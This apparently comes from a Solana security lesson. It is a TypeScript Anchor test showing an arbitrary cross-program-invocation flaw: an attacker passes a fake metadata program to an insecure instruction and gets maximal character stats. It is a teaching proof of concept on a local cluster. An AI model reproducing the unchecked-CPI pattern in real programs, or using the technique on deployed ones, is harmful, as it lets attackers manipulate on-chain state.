import * as anchor from "@coral-xyz/anchor";
import { Program, Wallet } from "@coral-xyz/anchor";
import { Gameplay } from "../target/types/gameplay";
import { FakeMetadata } from "../target/types/fake_metadata";
import { CharacterMetadata } from "../target/types/character_metadata";
import { Keypair } from "@solana/web3.js";
import { getMetadataKey, safeAirdrop } from "./utils/utils";
import { expect } from "chai";
describe("arbitrary-cpi", async () => {
  let gameplayProgram: Program<Gameplay>;
  let metadataProgram: Program<CharacterMetadata>;
  let fakeMetadataProgram: Program<FakeMetadata>;
  let provider;
  let connection;
  let playerOne;
  let attacker;

  beforeEach(async () => {
    // Configure the client to use the local cluster.
    anchor.setProvider(anchor.AnchorProvider.env());

    gameplayProgram = anchor.workspace.Gameplay as Program<Gameplay>;
    metadataProgram = anchor.workspace
      .CharacterMetadata as Program<CharacterMetadata>;
    fakeMetadataProgram = anchor.workspace
      .FakeMetadata as Program<FakeMetadata>;

    provider = anchor.AnchorProvider.env();
    connection = provider.connection;

    playerOne = Keypair.generate();
    attacker = Keypair.generate();

    await safeAirdrop(playerOne.publicKey, connection);
    await safeAirdrop(attacker.publicKey, connection);
  });

  it("Insecure instructions allow attacker to win every time successfully", async () => {
    // Initialize player one with real metadata program
    await gameplayProgram.methods
      .createCharacterInsecure()
      .accounts({
        metadataProgram: metadataProgram.programId,
        authority: playerOne.publicKey,
      })
      .signers([playerOne])
      .rpc();

    // Initialize attacker with fake metadata program
    await gameplayProgram.methods
      .createCharacterInsecure()
      .accounts({
        metadataProgram: fakeMetadataProgram.programId,
        authority: attacker.publicKey,
      })
      .signers([attacker])
      .rpc();

    const [playerOneMetadataKey] = getMetadataKey(
      playerOne.publicKey,
      gameplayProgram.programId,
      metadataProgram.programId
    );

    const [attackerMetadataKey] = getMetadataKey(
      attacker.publicKey,
      gameplayProgram.programId,
      fakeMetadataProgram.programId
    );

    const playerOneMetadata = await metadataProgram.account.metadata.fetch(
      playerOneMetadataKey
    );

    const attackerMetadata = await fakeMetadataProgram.account.metadata.fetch(
      attackerMetadataKey
    );

    expect(playerOneMetadata.health).to.be.lessThan(20);
    expect(playerOneMetadata.power).to.be.lessThan(20);

    expect(attackerMetadata.health).to.equal(255);
    expect(attackerMetadata.power).to.equal(255);
  });
});
